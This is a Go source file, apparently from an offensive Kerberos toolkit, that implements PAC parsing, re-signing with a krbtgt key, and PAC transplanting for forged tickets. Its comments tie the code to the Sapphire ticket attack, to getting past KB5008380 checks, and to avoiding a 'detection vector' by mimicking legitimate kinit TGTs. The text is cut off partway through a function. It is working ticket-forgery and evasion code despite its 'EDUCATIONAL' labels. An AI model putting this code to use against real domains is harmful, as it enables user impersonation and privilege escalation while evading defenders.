package pac

import (
	"bytes"
	"crypto/hmac"
	"crypto/md5"
	"encoding/binary"
	"fmt"
	"time"

	"github.com/goobeus/goobeus/pkg/crypto"
)

// ═══════════════════════════════════════════════════════════════════════════════
// PAC SIGNING AND RE-SIGNING
// ═══════════════════════════════════════════════════════════════════════════════
//
// PAC SIGNATURE TYPES (MS-PAC 2.8):
// ═════════════════════════════════
//
//   Server Checksum (Type 6):
//   - Signs the entire PAC (with both signatures zeroed)
//   - Uses the service key (for TGT, this is krbtgt key)
//   - Proves the service (or KDC) created this PAC
//
//   KDC Checksum (Type 7):
//   - Signs ONLY the Server Checksum signature bytes
//   - Always uses krbtgt key
//   - Proves the KDC vouches for this PAC
//   - "Signature of the signature"
//
// CHECKSUM ALGORITHMS:
// ════════════════════
//
//   HMAC_MD5 (-138, 0xFFFFFF76):
//   - Used with RC4 encryption
//   - 16-byte signature
//   - Key derivation: HMAC_MD5(key, "signaturekey\x00")
//
//   HMAC_SHA1_96_AES (15, 16):
//   - Used with AES128/AES256 encryption
//   - 12-byte signature (SHA1 truncated)
//   - Uses Kerberos key derivation
//
// RE-SIGNING PROCESS:
// ═══════════════════
//
//   1. Parse PAC to locate signature buffers
//   2. Zero out both Server and KDC signature bytes (keep type fields)
//   3. Calculate Server Checksum over entire PAC
//   4. Insert Server signature
//   5. Calculate KDC Checksum over Server signature bytes only
//   6. Insert KDC signature
//

// Checksum algorithm constants
const (
	// KERB_CHECKSUM_HMAC_MD5 for RC4 encryption (signed 32-bit)
	KERB_CHECKSUM_HMAC_MD5 int32 = -138

	// HMAC_SHA1_96_AES128 for AES128 encryption
	HMAC_SHA1_96_AES128 int32 = 15

	// HMAC_SHA1_96_AES256 for AES256 encryption
	HMAC_SHA1_96_AES256 int32 = 16
)

// ParsePACForSigning parses a PAC from raw bytes for re-signing.
func ParsePACForSigning(data []byte) (*PAC, error) {
	if len(data) < 8 {
		return nil, fmt.Errorf("PAC too short: %d bytes", len(data))
	}

	pac := &PAC{
		RawData: make([]byte, len(data)),
	}
	copy(pac.RawData, data)

	// Read header: cBuffers (4 bytes) + Version (4 bytes)
	cBuffers := binary.LittleEndian.Uint32(data[0:4])
	pac.Version = binary.LittleEndian.Uint32(data[4:8])

	if pac.Version != 0 {
		return nil, fmt.Errorf("unsupported PAC version: %d", pac.Version)
	}

	// Read buffer info entries (each is 16 bytes)
	offset := 8
	for i := uint32(0); i < cBuffers; i++ {
		if offset+16 > len(data) {
			return nil, fmt.Errorf("PAC truncated at buffer %d", i)
		}

		buf := PACBuffer{
			Type:   binary.LittleEndian.Uint32(data[offset : offset+4]),
			Size:   binary.LittleEndian.Uint32(data[offset+4 : offset+8]),
			Offset: binary.LittleEndian.Uint64(data[offset+8 : offset+16]),
		}

		// Extract buffer data
		bufStart := int(buf.Offset)
		bufEnd := bufStart + int(buf.Size)
		if bufStart >= 0 && bufEnd <= len(data) {
			buf.Data = make([]byte, buf.Size)
			copy(buf.Data, data[bufStart:bufEnd])
		}

		pac.Buffers = append(pac.Buffers, buf)
		offset += 16
	}

	return pac, nil
}

// GetBuffer returns the buffer of the specified type, or nil if not found.
func (p *PAC) GetBuffer(bufType uint32) *PACBuffer {
	for i := range p.Buffers {
		if p.Buffers[i].Type == bufType {
			return &p.Buffers[i]
		}
	}
	return nil
}

// ResignPAC re-signs a PAC with the provided key.
//
// EDUCATIONAL: Why PAC Re-signing is Needed
//
// When we steal a PAC from an S4U2Self ticket and insert it into a TGT:
// - The original PAC was signed with different keys
// - The KDC will validate the signatures when we use the TGT
// - We must re-sign with the krbtgt key to match the TGT encryption
//
// Parameters:
//   - pacData: Raw PAC bytes
//   - key: The krbtgt key (AES256, AES128, or RC4/NTLM)
//   - etype: Encryption type (18=AES256, 17=AES128, 23=RC4)
//
// Returns the re-signed PAC bytes.
func ResignPAC(pacData []byte, key []byte, etype int32) ([]byte, error) {
	pac, err := ParsePACForSigning(pacData)
	if err != nil {
		return nil, fmt.Errorf("failed to parse PAC: %w", err)
	}

	// Make a copy of the PAC data to modify
	newPAC := make([]byte, len(pacData))
	copy(newPAC, pacData)

	// Find signature buffers
	serverSigBuf := pac.GetBuffer(ServerChecksumType)
	kdcSigBuf := pac.GetBuffer(KDCChecksumType)

	if serverSigBuf == nil {
		return nil, fmt.Errorf("PAC has no server signature buffer")
	}
	if kdcSigBuf == nil {
		return nil, fmt.Errorf("PAC has no KDC signature buffer")
	}

	// Determine checksum type and signature size based on etype
	var checksumType int32
	var sigSize int

	switch etype {
	case crypto.EtypeAES256:
		checksumType = HMAC_SHA1_96_AES256
		sigSize = 12
	case crypto.EtypeAES128:
		checksumType = HMAC_SHA1_96_AES128
		sigSize = 12
	case crypto.EtypeRC4:
		checksumType = KERB_CHECKSUM_HMAC_MD5
		sigSize = 16
	default:
		return nil, fmt.Errorf("unsupported etype for PAC signing: %d", etype)
	}

	// Get offsets
	serverSigOffset := int(serverSigBuf.Offset)
	kdcSigOffset := int(kdcSigBuf.Offset)

	// Step 1: Update checksum types in the signature buffers
	binary.LittleEndian.PutUint32(newPAC[serverSigOffset:serverSigOffset+4], uint32(checksumType))
	binary.LittleEndian.PutUint32(newPAC[kdcSigOffset:kdcSigOffset+4], uint32(checksumType))

	// Step 2: Zero out both signatures (keep the type field at offset +0)
	for i := 0; i < sigSize; i++ {
		if serverSigOffset+4+i < len(newPAC) {
			newPAC[serverSigOffset+4+i] = 0
		}
		if kdcSigOffset+4+i < len(newPAC) {
			newPAC[kdcSigOffset+4+i] = 0
		}
	}

	// Step 3: Calculate Server Checksum over entire PAC (with zeroed signatures)
	serverSig, err := calculatePACChecksum(newPAC, key, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to calculate server signature: %w", err)
	}

	// Step 4: Insert Server signature
	copy(newPAC[serverSigOffset+4:], serverSig[:sigSize])

	// Step 5: Calculate KDC Checksum over the Server signature only
	kdcSig, err := calculatePACChecksum(serverSig[:sigSize], key, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to calculate KDC signature: %w", err)
	}

	// Step 6: Insert KDC signature
	copy(newPAC[kdcSigOffset+4:], kdcSig[:sigSize])

	return newPAC, nil
}

// ResignPACWithKeys re-signs a PAC preserving original checksum types.
//
// EDUCATIONAL: Impacket-Compatible PAC Re-signing
//
// Unlike ResignPAC which overwrites checksum types, this function:
// - Preserves the ORIGINAL checksum types from the stolen PAC
// - Uses the appropriate key for each checksum type:
//   - RC4/HMAC-MD5 checksums → use NTLM hash
//   - AES checksums → use AES key
//
// This avoids a potential detection vector where forged tickets have
// different checksum types than legitimate tickets.
//
// Parameters:
//   - pacData: Raw PAC bytes
//   - ntHash: The krbtgt NTLM hash (for RC4 checksums)
//   - aesKey: The krbtgt AES256 key (for AES checksums)
//
// Returns the re-signed PAC bytes.
func ResignPACWithKeys(pacData []byte, ntHash []byte, aesKey []byte) ([]byte, error) {
	pac, err := ParsePACForSigning(pacData)
	if err != nil {
		return nil, fmt.Errorf("failed to parse PAC: %w", err)
	}

	// Make a copy of the PAC data to modify
	newPAC := make([]byte, len(pacData))
	copy(newPAC, pacData)

	// Find signature buffers
	serverSigBuf := pac.GetBuffer(ServerChecksumType)
	kdcSigBuf := pac.GetBuffer(KDCChecksumType)

	if serverSigBuf == nil {
		return nil, fmt.Errorf("PAC has no server signature buffer")
	}
	if kdcSigBuf == nil {
		return nil, fmt.Errorf("PAC has no KDC signature buffer")
	}

	// Get offsets
	serverSigOffset := int(serverSigBuf.Offset)
	kdcSigOffset := int(kdcSigBuf.Offset)

	// Read ORIGINAL checksum types from the PAC
	serverChecksumType := int32(binary.LittleEndian.Uint32(serverSigBuf.Data[0:4]))
	kdcChecksumType := int32(binary.LittleEndian.Uint32(kdcSigBuf.Data[0:4]))

	fmt.Printf("[DEBUG] Original PAC checksum types: Server=%d (%s), KDC=%d (%s)\n",
		serverChecksumType, getChecksumTypeName(serverChecksumType),
		kdcChecksumType, getChecksumTypeName(kdcChecksumType))

	// Determine key and sig size for each checksum
	serverKey, serverEtype, serverSigSize, err := getKeyForChecksumType(serverChecksumType, ntHash, aesKey)
	if err != nil {
		return nil, fmt.Errorf("server checksum: %w", err)
	}

	kdcKey, kdcEtype, kdcSigSize, err := getKeyForChecksumType(kdcChecksumType, ntHash, aesKey)
	if err != nil {
		return nil, fmt.Errorf("KDC checksum: %w", err)
	}

	// Step 1: Zero out both signatures (keep the type fields)
	// We need to use the larger of the two sig sizes for zeroing
	maxSigSize := serverSigSize
	if kdcSigSize > maxSigSize {
		maxSigSize = kdcSigSize
	}

	for i := 0; i < maxSigSize; i++ {
		if serverSigOffset+4+i < len(newPAC) {
			newPAC[serverSigOffset+4+i] = 0
		}
		if kdcSigOffset+4+i < len(newPAC) {
			newPAC[kdcSigOffset+4+i] = 0
		}
	}

	// Step 2: Calculate Server Checksum over entire PAC (with zeroed signatures)
	serverSig, err := calculatePACChecksum(newPAC, serverKey, serverEtype)
	if err != nil {
		return nil, fmt.Errorf("failed to calculate server signature: %w", err)
	}

	// Step 3: Insert Server signature
	copy(newPAC[serverSigOffset+4:], serverSig[:serverSigSize])

	// Step 4: Calculate KDC Checksum over the Server signature only
	kdcSig, err := calculatePACChecksum(serverSig[:serverSigSize], kdcKey, kdcEtype)
	if err != nil {
		return nil, fmt.Errorf("failed to calculate KDC signature: %w", err)
	}

	// Step 5: Insert KDC signature
	copy(newPAC[kdcSigOffset+4:], kdcSig[:kdcSigSize])

	fmt.Printf("[DEBUG] Re-signed PAC with preserved checksum types\n")
	return newPAC, nil
}

// getKeyForChecksumType returns the appropriate key and params for a checksum type.
func getKeyForChecksumType(checksumType int32, ntHash, aesKey []byte) (key []byte, etype int32, sigSize int, err error) {
	switch checksumType {
	case HMAC_SHA1_96_AES256:
		if len(aesKey) < 32 {
			return nil, 0, 0, fmt.Errorf("AES256 checksum requires --aeskey (32 bytes)")
		}
		return aesKey, crypto.EtypeAES256, 12, nil

	case HMAC_SHA1_96_AES128:
		if len(aesKey) < 16 {
			return nil, 0, 0, fmt.Errorf("AES128 checksum requires --aeskey (16 bytes)")
		}
		return aesKey[:16], crypto.EtypeAES128, 12, nil

	case KERB_CHECKSUM_HMAC_MD5:
		if len(ntHash) != 16 {
			return nil, 0, 0, fmt.Errorf("HMAC-MD5 checksum requires --nthash (16 bytes)")
		}
		return ntHash, crypto.EtypeRC4, 16, nil

	default:
		return nil, 0, 0, fmt.Errorf("unsupported checksum type: %d", checksumType)
	}
}

// calculatePACChecksum calculates a PAC checksum.
//
// EDUCATIONAL: PAC Checksum Algorithm
//
// For HMAC_MD5 (RC4):
//  1. Derive signing key: HMAC_MD5(key, "signaturekey\x00")
//  2. Calculate: HMAC_MD5(signing_key, data)
//
// For HMAC_SHA1_96_AES:
//  1. Derive key using Kerberos key derivation (usage=17, type=checksum)
//  2. Calculate: HMAC_SHA1(derived_key, data)[0:12]
func calculatePACChecksum(data []byte, key []byte, etype int32) ([]byte, error) {
	switch etype {
	case crypto.EtypeAES256:
		// Use the crypto package's proper implementation
		return crypto.HMACSHA1AES256(key, data)

	case crypto.EtypeAES128:
		return crypto.HMACSHA1AES128(key, data)

	case crypto.EtypeRC4:
		// RC4/HMAC_MD5 checksum
		// Step 1: Derive signing key
		signKey := hmacMD5(key, []byte("signaturekey\x00"))

		// Step 2: HMAC-MD5 with signing key
		return hmacMD5(signKey, data), nil

	default:
		return nil, fmt.Errorf("unsupported etype: %d", etype)
	}
}

// hmacMD5 calculates HMAC-MD5.
func hmacMD5(key, data []byte) []byte {
	h := hmac.New(md5.New, key)
	h.Write(data)
	return h.Sum(nil)
}

// DebugPAC prints debug information about a PAC.
func DebugPAC(data []byte) {
	pac, err := ParsePACForSigning(data)
	if err != nil {
		fmt.Printf("[DEBUG] PAC parse error: %v\n", err)
		return
	}

	fmt.Printf("[DEBUG] PAC: %d buffers, version %d, size %d\n",
		len(pac.Buffers), pac.Version, len(data))

	for i, buf := range pac.Buffers {
		typeName := getBufferTypeName(buf.Type)
		fmt.Printf("  [%d] Type=%d (%s), Size=%d, Offset=%d\n",
			i, buf.Type, typeName, buf.Size, buf.Offset)

		// For signature buffers, show details
		if buf.Type == ServerChecksumType || buf.Type == KDCChecksumType {
			if len(buf.Data) >= 4 {
				sigType := int32(binary.LittleEndian.Uint32(buf.Data[0:4]))
				sigTypeName := getChecksumTypeName(sigType)
				fmt.Printf("       SigType=%d (%s)\n", sigType, sigTypeName)
				if len(buf.Data) > 4 {
					sigBytes := buf.Data[4:]
					if len(sigBytes) > 8 {
						sigBytes = sigBytes[:8]
					}
					fmt.Printf("       Sig (first 8): %x\n", sigBytes)
				}
			}
		}

		// Show first bytes of each buffer for debugging
		if len(buf.Data) > 0 {
			showLen := 16
			if len(buf.Data) < showLen {
				showLen = len(buf.Data)
			}
			fmt.Printf("       Data[:%d]: %x\n", showLen, buf.Data[:showLen])
		}
	}
}

func getBufferTypeName(t uint32) string {
	switch t {
	case LogonInfoType:
		return "LOGON_INFO"
	case CredentialsType:
		return "CREDENTIALS"
	case ServerChecksumType:
		return "SERVER_CHECKSUM"
	case KDCChecksumType:
		return "KDC_CHECKSUM"
	case ClientInfoType:
		return "CLIENT_INFO"
	case S4UDelegationInfoType:
		return "S4U_DELEGATION"
	case UPNDNSInfoType:
		return "UPN_DNS_INFO"
	case ClientClaimsType:
		return "CLIENT_CLAIMS"
	case DeviceInfoType:
		return "DEVICE_INFO"
	case DeviceClaimsType:
		return "DEVICE_CLAIMS"
	case TicketChecksumType:
		return "TICKET_CHECKSUM"
	case AttributesType:
		return "ATTRIBUTES_INFO"
	case RequestorType:
		return "REQUESTOR_SID"
	case FullChecksumType:
		return "FULL_CHECKSUM"
	default:
		return "UNKNOWN"
	}
}

// GetBufferTypeName returns the canonical PAC buffer type name (exported wrapper).
func GetBufferTypeName(t uint32) string { return getBufferTypeName(t) }

func getChecksumTypeName(t int32) string {
	switch t {
	case KERB_CHECKSUM_HMAC_MD5:
		return "HMAC_MD5"
	case HMAC_SHA1_96_AES128:
		return "HMAC_SHA1_96_AES128"
	case HMAC_SHA1_96_AES256:
		return "HMAC_SHA1_96_AES256"
	default:
		return "UNKNOWN"
	}
}

// FindPACInAuthData locates the PAC within Kerberos AuthorizationData.
// Returns the PAC bytes and the offset where they were found.
func FindPACInAuthData(data []byte) (pacData []byte, offset int, found bool) {
	// PAC signature: first 4 bytes is buffer count (small), next 4 is version (0)
	for i := 0; i < len(data)-8; i++ {
		bufCount := binary.LittleEndian.Uint32(data[i : i+4])
		version := binary.LittleEndian.Uint32(data[i+4 : i+8])

		// PAC has version 0 and reasonable buffer count (1-20)
		if version == 0 && bufCount > 0 && bufCount < 20 {
			// Calculate expected header size
			headerSize := 8 + (16 * int(bufCount))
			if i+headerSize > len(data) {
				continue
			}

			// Verify buffer offsets are valid
			valid := true
			maxEnd := headerSize
			for j := 0; j < int(bufCount); j++ {
				bufOffset := 8 + (j * 16)
				if i+bufOffset+16 > len(data) {
					valid = false
					break
				}
				off := int(binary.LittleEndian.Uint64(data[i+bufOffset+8 : i+bufOffset+16]))
				size := int(binary.LittleEndian.Uint32(data[i+bufOffset+4 : i+bufOffset+8]))

				// Offset should be within PAC, and size should be reasonable
				if off > len(data)-i || size > len(data)-i || off+size > len(data)-i {
					valid = false
					break
				}
				if off+size > maxEnd {
					maxEnd = off + size
				}
			}

			if valid {
				// Align to 8 bytes
				maxEnd = (maxEnd + 7) &^ 7
				if i+maxEnd <= len(data) {
					return data[i : i+maxEnd], i, true
				}
				return data[i:], i, true
			}
		}
	}
	return nil, 0, false
}

// ReplacePACInAuthData replaces the PAC bytes in AuthorizationData.
func ReplacePACInAuthData(authData []byte, newPAC []byte) ([]byte, error) {
	oldPAC, offset, found := FindPACInAuthData(authData)
	if !found {
		return nil, fmt.Errorf("no PAC found in authorization data")
	}

	// Verify we found the right location
	if !bytes.Equal(authData[offset:offset+len(oldPAC)], oldPAC) {
		return nil, fmt.Errorf("PAC location mismatch")
	}

	oldLen := len(oldPAC)
	newLen := len(newPAC)

	// Build result with replaced PAC
	result := make([]byte, len(authData)-oldLen+newLen)
	copy(result[:offset], authData[:offset])
	copy(result[offset:], newPAC)
	copy(result[offset+newLen:], authData[offset+oldLen:])

	return result, nil
}

// AddKB5008380Buffers adds PAC_REQUESTOR (type 18) and PAC_ATTRIBUTES_INFO (type 17) buffers to a PAC.
// These buffers are required by KB5008380 patched Domain Controllers (enforcement since July 2022).
//
// EDUCATIONAL: KB5008380 (CVE-2021-42287)
//
// This security update addresses PAC spoofing vulnerabilities by requiring:
// - PAC_REQUESTOR: Contains the SID of the user who originally requested the ticket
// - PAC_ATTRIBUTES_INFO: Contains flags indicating the PAC's attributes
//
// S4U2Self service tickets don't have these buffers, so we must add them when
// transplanting the PAC into a TGT for the Sapphire ticket attack.
//
// Parameters:
//   - pacData: Raw PAC bytes from S4U2Self ticket
//   - userSID: The SID of the impersonated user (must match PAC_LOGON_INFO)
//
// Returns the modified PAC with the new buffers added.
func AddKB5008380Buffers(pacData []byte, userSID *SID) ([]byte, error) {
	pac, err := ParsePACForSigning(pacData)
	if err != nil {
		return nil, fmt.Errorf("failed to parse PAC: %w", err)
	}

	// Check if buffers already exist
	hasRequestor := false
	hasAttributes := false
	for _, buf := range pac.Buffers {
		if buf.Type == RequestorType {
			hasRequestor = true
		}
		if buf.Type == AttributesType {
			hasAttributes = true
		}
	}

	if hasRequestor && hasAttributes {
		// Already has the required buffers
		return pacData, nil
	}

	// Build new buffer data
	var requestorData, attributesData []byte

	if !hasRequestor && userSID != nil {
		// PAC_REQUESTOR is just the raw SID bytes
		requestorData = userSID.Bytes()
	}

	if !hasAttributes {
		// PAC_ATTRIBUTES_INFO: FlagsLength (4 bytes) + Flags (4 bytes)
		// Flags: 0x00000002 = PAC_WAS_REQUESTED
		attributesData = make([]byte, 8)
		binary.LittleEndian.PutUint32(attributesData[0:4], 32)         // FlagsLength in bits
		binary.LittleEndian.PutUint32(attributesData[4:8], 0x00000002) // PAC_WAS_REQUESTED
	}

	// Calculate how much space we need to add
	newBufferCount := len(pac.Buffers)
	extraHeaderSpace := 0
	extraDataSpace := 0

	if len(requestorData) > 0 {
		newBufferCount++
		extraHeaderSpace += 16 // PAC_INFO_BUFFER size
		extraDataSpace += len(requestorData)
		extraDataSpace = (extraDataSpace + 7) &^ 7 // Align to 8
	}
	if len(attributesData) > 0 {
		newBufferCount++
		extraHeaderSpace += 16
		extraDataSpace += len(attributesData)
		extraDataSpace = (extraDataSpace + 7) &^ 7
	}

	if extraHeaderSpace == 0 {
		return pacData, nil
	}

	// Rebuild the PAC with new buffers
	// New structure: header + all buffer headers + all buffer data
	newHeaderSize := 8 + newBufferCount*16
	oldHeaderSize := 8 + len(pac.Buffers)*16

	// Calculate total size after adding buffers
	// We need to shift all existing data offsets by the extra header space
	newPACSize := len(pacData) + extraHeaderSpace + extraDataSpace

	newPAC := make([]byte, newPACSize)

	// Write new header
	binary.LittleEndian.PutUint32(newPAC[0:4], uint32(newBufferCount))
	binary.LittleEndian.PutUint32(newPAC[4:8], 0) // Version

	// Copy existing buffer headers with adjusted offsets
	headerPos := 8
	for _, buf := range pac.Buffers {
		binary.LittleEndian.PutUint32(newPAC[headerPos:headerPos+4], buf.Type)
		binary.LittleEndian.PutUint32(newPAC[headerPos+4:headerPos+8], buf.Size)
		// Adjust offset by the extra header space
		newOffset := buf.Offset + uint64(extraHeaderSpace)
		binary.LittleEndian.PutUint64(newPAC[headerPos+8:headerPos+16], newOffset)
		headerPos += 16
	}

	// Add new buffer headers
	dataPos := len(pacData) + extraHeaderSpace // New data starts after old data (shifted)

	if len(attributesData) > 0 {
		binary.LittleEndian.PutUint32(newPAC[headerPos:headerPos+4], AttributesType)
		binary.LittleEndian.PutUint32(newPAC[headerPos+4:headerPos+8], uint32(len(attributesData)))
		binary.LittleEndian.PutUint64(newPAC[headerPos+8:headerPos+16], uint64(dataPos))
		headerPos += 16
		// Write attributes data later
	}

	if len(requestorData) > 0 {
		attrDataSize := 0
		if len(attributesData) > 0 {
			attrDataSize = (len(attributesData) + 7) &^ 7
		}
		binary.LittleEndian.PutUint32(newPAC[headerPos:headerPos+4], RequestorType)
		binary.LittleEndian.PutUint32(newPAC[headerPos+4:headerPos+8], uint32(len(requestorData)))
		binary.LittleEndian.PutUint64(newPAC[headerPos+8:headerPos+16], uint64(dataPos+attrDataSize))
		headerPos += 16
	}

	// Copy existing buffer data (shifted by extra header space)
	copy(newPAC[newHeaderSize:], pacData[oldHeaderSize:])

	// Append new buffer data
	dataWritePos := len(pacData) + extraHeaderSpace
	if len(attributesData) > 0 {
		copy(newPAC[dataWritePos:], attributesData)
		dataWritePos += (len(attributesData) + 7) &^ 7
	}
	if len(requestorData) > 0 {
		copy(newPAC[dataWritePos:], requestorData)
	}

	fmt.Printf("[DEBUG] AddKB5008380Buffers: added %d new buffers, PAC size %d -> %d\n",
		newBufferCount-len(pac.Buffers), len(pacData), len(newPAC))

	return newPAC, nil
}

// ExtractUserSIDFromPAC extracts the user SID from PAC_LOGON_INFO buffer.
// This is used to get the impersonated user's SID for PAC_REQUESTOR.
//
// EDUCATIONAL: User SID Construction
// In KERB_VALIDATION_INFO:
// - LogonDomainId = Domain SID (e.g., S-1-5-21-xxx-xxx-xxx) - 4 sub-authorities
// - User SID = Domain SID + User RID (e.g., S-1-5-21-xxx-xxx-xxx-1115) - 5 sub-authorities
//
// We search for a 5-subauthority SID directly in the data, which is the user SID.
func ExtractUserSIDFromPAC(pacData []byte) (*SID, error) {
	pac, err := ParsePACForSigning(pacData)
	if err != nil {
		return nil, fmt.Errorf("failed to parse PAC: %w", err)
	}

	// Find LOGON_INFO buffer
	logonBuf := pac.GetBuffer(LogonInfoType)
	if logonBuf == nil {
		return nil, fmt.Errorf("PAC has no LOGON_INFO buffer")
	}

	data := logonBuf.Data
	if len(data) < 100 {
		return nil, fmt.Errorf("LOGON_INFO too short")
	}

	// Strategy 1: Search for a 5-subauthority SID (the full user SID)
	// This is more reliable than parsing NDR offsets
	for i := 0; i < len(data)-28; i++ {
		// Look for: Revision=1, NumSubAuth=5, Authority=5 (NT)
		if data[i] == 0x01 && data[i+1] == 0x05 { // User SID has 5 sub-authorities
			if data[i+2] == 0 && data[i+3] == 0 && data[i+4] == 0 && data[i+5] == 0 && data[i+6] == 0 && data[i+7] == 5 {
				// Found potential user SID (S-1-5-...)
				if i+28 <= len(data) {
					sub0 := binary.LittleEndian.Uint32(data[i+8:])
					if sub0 == 21 { // Verify it starts with 21 (domain SID pattern)
						// Get the last sub-authority (user RID)
						userRID := binary.LittleEndian.Uint32(data[i+24:])
						// Validate RID is reasonable (500+ for built-in, 1000+ for regular)
						if userRID >= 500 && userRID < 100000 {
							userSID := &SID{
								Revision:          data[i],
								NumSubAuthorities: data[i+1],
							}
							copy(userSID.Authority[:], data[i+2:i+8])
							userSID.SubAuthorities = make([]uint32, 5)
							for j := 0; j < 5; j++ {
								userSID.SubAuthorities[j] = binary.LittleEndian.Uint32(data[i+8+j*4:])
							}
							fmt.Printf("[DEBUG] Found user SID directly: %s (RID=%d)\n", userSID.String(), userRID)
							return userSID, nil
						}
					}
				}
			}
		}
	}

	// Strategy 2: Fall back to finding domain SID and searching for RID nearby
	fmt.Println("[DEBUG] No direct user SID found, trying domain SID + RID approach...")

	var domainSID *SID
	var domainSIDOffset int

	// Search for domain SID (4 sub-authorities)
	for i := 0; i < len(data)-24; i++ {
		if data[i] == 0x01 && data[i+1] == 0x04 { // Domain SID has 4 sub-authorities
			if data[i+2] == 0 && data[i+3] == 0 && data[i+4] == 0 && data[i+5] == 0 && data[i+6] == 0 && data[i+7] == 5 {
				if i+24 <= len(data) {
					sub0 := binary.LittleEndian.Uint32(data[i+8:])
					if sub0 == 21 {
						domainSID = &SID{
							Revision:          data[i],
							NumSubAuthorities: data[i+1],
						}
						copy(domainSID.Authority[:], data[i+2:i+8])
						domainSID.SubAuthorities = make([]uint32, 4)
						for j := 0; j < 4; j++ {
							domainSID.SubAuthorities[j] = binary.LittleEndian.Uint32(data[i+8+j*4:])
						}
						domainSIDOffset = i
						fmt.Printf("[DEBUG] Found domain SID at offset %d: %s\n", i, domainSID.String())
						break
					}
				}
			}
		}
	}

	if domainSID == nil {
		return nil, fmt.Errorf("could not find domain SID in LOGON_INFO")
	}

	// Look for user RID immediately after domain SID (common pattern)
	// Or search backwards from domain SID for the UserId field
	var userRID uint32

	// Check bytes right after the domain SID
	afterSID := domainSIDOffset + 24
	if afterSID+4 <= len(data) {
		candidateRID := binary.LittleEndian.Uint32(data[afterSID:])
		if candidateRID >= 500 && candidateRID < 100000 {
			userRID = candidateRID
			fmt.Printf("[DEBUG] Found RID after domain SID: %d\n", userRID)
		}
	}

	// Also search for PrimaryGroupId (513 = Domain Users) and look for UserId before it
	if userRID == 0 {
		for i := 0; i < len(data)-8; i++ {
			pgid := binary.LittleEndian.Uint32(data[i:])
			if pgid == 513 { // Domain Users
				// UserId is typically right before PrimaryGroupId
				if i >= 4 {
					candidateRID := binary.LittleEndian.Uint32(data[i-4:])
					if candidateRID >= 500 && candidateRID < 100000 {
						userRID = candidateRID
						fmt.Printf("[DEBUG] Found RID before PrimaryGroupId: %d\n", userRID)
						break
					}
				}
			}
		}
	}

	if userRID == 0 {
		return nil, fmt.Errorf("could not find user RID in LOGON_INFO")
	}

	// Build user SID = domain SID + user RID
	userSID := &SID{
		Revision:          domainSID.Revision,
		NumSubAuthorities: domainSID.NumSubAuthorities + 1,
		Authority:         domainSID.Authority,
		SubAuthorities:    make([]uint32, len(domainSID.SubAuthorities)+1),
	}
	copy(userSID.SubAuthorities, domainSID.SubAuthorities)
	userSID.SubAuthorities[len(domainSID.SubAuthorities)] = userRID

	fmt.Printf("[DEBUG] Constructed user SID: %s (domain + RID %d)\n", userSID.String(), userRID)
	return userSID, nil
}

// ClearExtraSids normalizes the ExtraSids array AND removes the
// ResourceGroupDomainSid deferred block to match a legit MIT kinit AS-REQ TGT.
//
// Two coordinated NDR-level edits:
//
//  1. ExtraSids substitution (no size change): replace the S-1-18-2
//     (SERVICE_ASSERTED_IDENTITY) RPC_SID with S-1-18-1
//     (AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY) in-place. Kinit TGTs
//     carry exactly one extra SID = S-1-18-1 with SidCount=1.
//
//  2. ResourceGroupDomainSid strip (-28 bytes): null the
//     ResourceGroupDomainSid_ptr in the fixed struct AND remove its 28-byte
//     deferred block (4-byte conformance count + 24-byte RPC_SID for the
//     domain SID). Kinit's PAC has this pointer null (no deferred data);
//     S4U2Self emits a duplicate domain SID copy here.
//
// Net LOGON_INFO change: -28 bytes. This pairs with --strip-extra-groups
// (-12 bytes from RID 572 in ResourceGroupIds) to match kinit's exact size.
//
// Returns the modified PAC bytes and 1 if changes were made, 0 otherwise.
func ClearExtraSids(pacData []byte) ([]byte, int) {
	parsed, err := ParsePACForSigning(pacData)
	if err != nil {
		return pacData, 0
	}
	logonBuf := parsed.GetBuffer(LogonInfoType)
	if logonBuf == nil {
		return pacData, 0
	}
	bufStart := int(logonBuf.Offset)
	bufEnd := bufStart + int(logonBuf.Size)

	// === Phase 1: in-place S-1-18-2 → S-1-18-1 substitution. ===
	sid182 := []byte{0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x02, 0x00, 0x00, 0x00}
	sid181 := []byte{0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x01, 0x00, 0x00, 0x00}

	out := make([]byte, len(pacData))
	copy(out, pacData)

	extraSidEnd := -1
	for i := bufStart; i+12 <= bufEnd; i++ {
		if bytes.Equal(out[i:i+12], sid182) {
			copy(out[i:i+12], sid181)
			extraSidEnd = i + 12
			break
		}
	}
	if extraSidEnd < 0 {
		// Maybe already S-1-18-1 (re-run); locate it for phase 2.
		for i := bufStart; i+12 <= bufEnd; i++ {
			if bytes.Equal(out[i:i+12], sid181) {
				extraSidEnd = i + 12
				break
			}
		}
	}
	if extraSidEnd < 0 {
		return pacData, 0
	}

	// === Phase 2: strip ResourceGroupDomainSid 28-byte deferred block. ===
	// Per NDR pointer-encounter ordering in KERB_VALIDATION_INFO, the
	// ResourceGroupDomainSid deferred data sits immediately after ExtraSids
	// deferred. Layout (28 bytes):
	//   [conformance count = 4 (matches SubAuthCount)] : 4 bytes
	//   [RPC_SID for S-1-5-21-X-X-X = revision(1) + subAuthCount(1) +
	//    authority(6) + 4 sub-auths × 4 bytes = 24 bytes]
	deferredStart := extraSidEnd
	deferredEnd := deferredStart + 28
	if deferredEnd > bufEnd {
		return out, 1 // phase 1 already applied; return without phase 2
	}

	// Validate the bytes look like a domain SID (S-1-5-21-X-X-X).
	confCount := binary.LittleEndian.Uint32(out[deferredStart:])
	if confCount != 4 {
		return out, 1
	}
	if out[deferredStart+4] != 0x01 || // revision
		out[deferredStart+5] != 0x04 || // subAuthCount
		out[deferredStart+11] != 0x05 { // authority byte 7 (=5)
		return out, 1
	}

	// Find ResourceGroupDomainSid_ptr in the fixed struct.
	// Pattern: [referent_ptr][small_count][referent_ptr] with both pointers
	// looking like NDR referents (>= 0x00020000, high byte 0). Restricting
	// to referent-shaped values filters out coincidental matches in deferred
	// strings and group entries (which use small literal values).
	// Take the LAST match before deferredStart — that's the genuine
	// {ResourceGroupDomainSid_ptr, ResourceGroupCount, ResourceGroupIds_ptr}
	// triple at the end of the fixed struct.
	rgdsPtrPos := -1
	for i := bufStart + 16; i+12 <= deferredStart; i += 4 {
		ptr1 := binary.LittleEndian.Uint32(out[i:])
		cnt := binary.LittleEndian.Uint32(out[i+4:])
		ptr2 := binary.LittleEndian.Uint32(out[i+8:])
